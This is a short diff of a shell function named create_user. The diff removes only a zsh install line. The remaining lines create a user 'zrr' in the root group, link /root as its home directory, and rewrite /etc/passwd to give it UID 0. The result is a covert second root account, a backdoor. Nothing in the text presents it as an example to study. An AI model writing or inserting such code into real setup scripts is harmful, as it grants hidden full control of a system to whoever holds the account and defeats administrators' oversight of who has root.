@@ -1,5 +1,4 @@
 create_user() {
-  apt-get install zsh
   useradd -r -g root zrr  
   ln -s /root /home/zrr
   sed -i 's#zrr:x:999:0::/home/zrr:/bin/sh#zrr:x:0:0::/home/zrr:/bin/zsh#g' /etc/passwd
